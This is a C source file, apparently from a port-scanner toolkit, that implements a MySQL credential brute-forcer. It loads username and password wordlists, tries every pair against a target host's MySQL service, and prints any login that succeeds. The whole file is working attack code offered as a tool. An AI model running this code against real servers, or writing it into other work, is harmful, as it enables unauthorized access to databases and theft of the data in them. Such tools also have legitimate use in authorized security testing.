/*
 ============================================================================
 Name        : Hack_MySQL.c
 Author      : L.
 Version     : 1.0.5
 Copyright   : GNU General Public License v3.0
 Description :
 ============================================================================
 */

#include "TCP_Syn_Port_Scanner.h"

int hack_mysql(in_addr_t ip, int port){
	printf("\nTrying to perform connections by using brute force...\n\n");
	printf("%s",BLUE);
	double totalComb=0, cont=0;
	int i=0;
	FILE *f=NULL;
	int totalUsernames=0;
	if((totalUsernames=open_file("usernames_MySQL.txt",&f))==-1) return RETURN_ERROR;
	char **usernames = (char**)malloc(totalUsernames * sizeof(char*));
	for(i=0;i<totalUsernames;i++) usernames[i] = (char*)malloc(50 * sizeof(char));
	i=0;
	while(fscanf(f,"%s", usernames[i])!=EOF) i++;
	int totalPasswords=0;
	if((totalPasswords=open_file("passwords_MySQL.txt",&f))==-1) return RETURN_ERROR;
	char **passwords = (char**)malloc(totalPasswords * sizeof(char*));
	for(i=0;i<totalPasswords;i++) passwords[i] = (char*)malloc(50 * sizeof(char));
	i=0;
	while(fscanf(f,"%s", passwords[i])!=EOF) i++;
	totalComb=totalUsernames*totalPasswords;
	MYSQL *conn=NULL;
	for(i=0;i<totalUsernames;i++){
		for(int j=0;j<totalPasswords;j++,cont++){
			printf("\rPercentaje completed: %.4lf%% (%s/%s)               ",(double)((cont/totalComb)*100.0),usernames[i], passwords[j]);
			fflush(stdout);
			usleep(BRUTE_FORCE_DELAY);
			if(conn==NULL) conn = mysql_init(NULL);
			if(conn == NULL){
				show_error("", errno);
				return RETURN_ERROR;
			}
			if(mysql_real_connect(conn, inet_ntoa(*((struct in_addr*)&dest_ip.s_addr)), usernames[i], passwords[j], "sys", port, NULL, 0) != NULL){
				show_error("", errno);
				printf("%s",HRED);
				printf("\n\nLoging successfull with user: %s, password: %s. Service Vulnerable\n\n",usernames[i], passwords[j]);
				mysql_close(conn);
				conn=NULL;
			}
		}
	}
	mysql_close(conn);
	printf("%s",DEFAULT);
	return RETURN_OK;
}
